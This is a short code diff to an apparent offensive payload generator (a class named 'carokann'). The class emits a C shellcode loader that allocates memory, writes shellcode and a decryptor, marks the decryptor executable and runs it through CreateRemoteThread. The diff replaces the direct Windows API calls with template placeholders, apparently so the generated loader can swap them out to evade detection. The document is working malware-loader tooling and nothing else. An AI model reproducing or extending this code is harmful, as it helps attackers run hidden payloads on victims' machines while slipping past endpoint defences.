@@ -32,18 +32,18 @@ class carokann:
    
     HANDLE hProcess = (HANDLE)-1;
     SIZE_T shellcodeSize = {shellcodeSize};
-    PVOID pRemoteShellcode = VirtualAllocEx( hProcess, NULL, shellcodeSize + sizeof(SIZE_T), MEM_COMMIT, PAGE_READWRITE );
+    PVOID pRemoteShellcode = {VirtualAllocEx}( hProcess, NULL, shellcodeSize + sizeof(SIZE_T), MEM_COMMIT, PAGE_READWRITE );
     
-    WriteProcessMemory( hProcess, pRemoteShellcode, &shellcodeSize, sizeof(SIZE_T), NULL );
-    WriteProcessMemory( hProcess, pRemoteShellcode + sizeof(SIZE_T), shellcode, shellcodeSize, NULL );
+    {WriteProcessMemory}( hProcess, pRemoteShellcode, &shellcodeSize, sizeof(SIZE_T), NULL );
+    {WriteProcessMemory}( hProcess, pRemoteShellcode + sizeof(SIZE_T), shellcode, shellcodeSize, NULL );
     
-    PVOID pRemoteDecryptor = VirtualAllocEx( hProcess, NULL, $decryptorLength, MEM_COMMIT, PAGE_READWRITE );
+    PVOID pRemoteDecryptor = {VirtualAllocEx}( hProcess, NULL, $decryptorLength, MEM_COMMIT, PAGE_READWRITE );
     
-    WriteProcessMemory( hProcess, pRemoteDecryptor, decryptor, $decryptorLength, NULL );
+    {WriteProcessMemory}( hProcess, pRemoteDecryptor, decryptor, $decryptorLength, NULL );
 
     DWORD OldProtect = 0;    
-    VirtualProtectEx( hProcess, pRemoteDecryptor, $decryptorLength, PAGE_EXECUTE_READ, &OldProtect );
-    HANDLE hThread         = CreateRemoteThread( hProcess, NULL, 0, pRemoteDecryptor, pRemoteShellcode, 0, NULL );
+    {VirtualProtectEx}( hProcess, pRemoteDecryptor, $decryptorLength, PAGE_EXECUTE_READ, &OldProtect );
+    HANDLE hThread         = {CreateRemoteThread}( hProcess, NULL, 0, pRemoteDecryptor, pRemoteShellcode, 0, NULL );
     
-    WaitForSingleObject( hThread, INFINITE );
+    {WaitForSingleObject}( hThread, INFINITE );
 """).substitute(target=self.target, memoryPermission=self.memoryPermission, decryptorBytes=bytes_to_c(self.decryptor, 'decryptor').replace('{', '{{').replace('}', '}}'), decryptorLength=self.decryptorLength)
